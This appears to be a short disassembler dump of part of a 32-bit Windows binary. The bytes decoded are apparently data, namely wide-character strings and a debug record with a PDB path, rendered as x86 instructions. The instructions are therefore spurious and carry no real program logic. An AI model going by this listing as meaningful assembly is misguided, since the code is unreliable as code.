  4348ee:	add    BYTE PTR [ecx+0x0],dl
  4348f1:	inc    esp
  4348f2:	add    BYTE PTR [eax],al
  4348f4:	add    BYTE PTR [edx+0x0],dl
  4348f7:	push   esp
  4348f8:	add    BYTE PTR ds:0x52005f00,dh
  4348fe:	add    BYTE PTR [edi+0x0],dl
  434901:	xor    al,BYTE PTR [eax]
  434903:	xor    al,BYTE PTR [eax]
  434905:	xor    BYTE PTR [eax],al
  434907:	xor    BYTE PTR [eax],al
  434909:	pop    edi
  43490a:	add    BYTE PTR [esi],dh
  43490c:	add    BYTE PTR [eax],al
  43490e:	add    BYTE PTR [eax+0x0],cl
  434911:	inc    ebp
  434912:	add    BYTE PTR [eax+eax*1+0x30],cl
  434916:	add    BYTE PTR [edi+0x0],bl
  434919:	dec    edx
  43491a:	add    BYTE PTR [edx],dh
  43491c:	add    BYTE PTR [edi],dh
  43491e:	add    BYTE PTR [ebp+0x0],dl
  434921:	add    BYTE PTR ss:[eax],dh
  434924:	add    BYTE PTR [eax],al
  434926:	add    BYTE PTR [esi+0x0],dl
  434929:	cmp    BYTE PTR [eax],al
  43492b:	dec    edi
  43492c:	add    BYTE PTR [ecx],bh
  43492e:	add    BYTE PTR [edi+0x0],bl
  434931:	pop    eax
  434932:	add    BYTE PTR [edx+0x0],bl
  434935:	dec    esp
  434936:	add    BYTE PTR [ebx+0x0],cl
  434939:	add    BYTE PTR [eax],al
  43493b:	dec    ecx
  43493c:	add    BYTE PTR [ebp+0x0],dl
  43493f:	dec    edi
  434940:	add    BYTE PTR [eax],al
  434942:	add    BYTE PTR [edx+0x53],dl
  434945:	inc    esp
  434946:	push   ebx
  434947:	sub    DWORD PTR [esi],ebp
  434949:	push   ecx
  43494a:	add    DWORD PTR [eax-0x2],edi
  43494d:	mov    cs,WORD PTR [ebx-0x4c]
  434950:	fmul   QWORD PTR [eax+eax*8]
  434953:	sub    DWORD PTR [eax],ecx
  434955:	sub    DWORD PTR [ecx+0x1a],esi
  434958:	add    BYTE PTR [eax],al
  43495a:	add    BYTE PTR [ebx+0x3a],dl
  43495d:	pop    esp
  43495e:	popa   
  43495f:	jbe    0x4349d6
  434961:	jns    0x4349d0
  434963:	dec    ecx
  434964:	jb     0x4349e0
  434966:	pop    esp
  434967:	bound  di,DWORD PTR [edx+0x52]
  43496b:	gs fs push ax
  43496f:	arpl   WORD PTR [esi+0x5c],si
  434972:	js     0x4349ce
  434974:	je     0x4349bd
  434976:	jno    0x4349ba
  434978:	jno    0x4349e1
  43497a:	bound  ebp,QWORD PTR [esi]
  43497c:	jo     0x4349e2
  43497e:	bound  eax,QWORD PTR [eax]
	...
